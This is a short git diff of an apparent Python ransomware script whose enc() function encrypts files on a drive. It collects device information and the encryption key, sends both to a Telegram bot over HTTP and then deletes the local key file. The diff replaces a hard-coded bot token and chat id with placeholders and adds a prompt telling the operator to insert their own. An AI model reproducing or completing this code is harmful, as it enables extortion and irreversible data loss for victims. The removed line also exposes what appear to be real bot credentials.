@@ -54,7 +54,7 @@ def enc(target_file_extention, encrypted_file_extention="maher", key=1, drive="D
             info = device_info.read()
             keyfile = open("key", "r")
             key = keyfile.read()
-            url = ("https://api.telegram.org/bot5265148504:AAEYGDSA2cMi4Eq5XQyDPEwyeH7coIn6k9s/SendMessage?chat_id=1202560419&text="+str(info)+"\n"+str(key))
+            url = ("https://api.telegram.org/bot{add your telegram bot apikey here}/SendMessage?chat_id={add your telegram chat id here}&text="+str(info)+"\n"+str(key))
 
             payloud = {"UrlBox":url,
                         "AgentList":"Mozilla Firefox",
@@ -65,7 +65,8 @@ def enc(target_file_extention, encrypted_file_extention="maher", key=1, drive="D
             print(req)
             os.remove(os.getcwd()+"\device-info")
             os.remove(os.getcwd()+"\key")
-    except: pass
+    except:
+        print ("Ops! Maybe you forgot to add your telegram bot api and chat id , fix it in the file (line 57)")
 
 
 
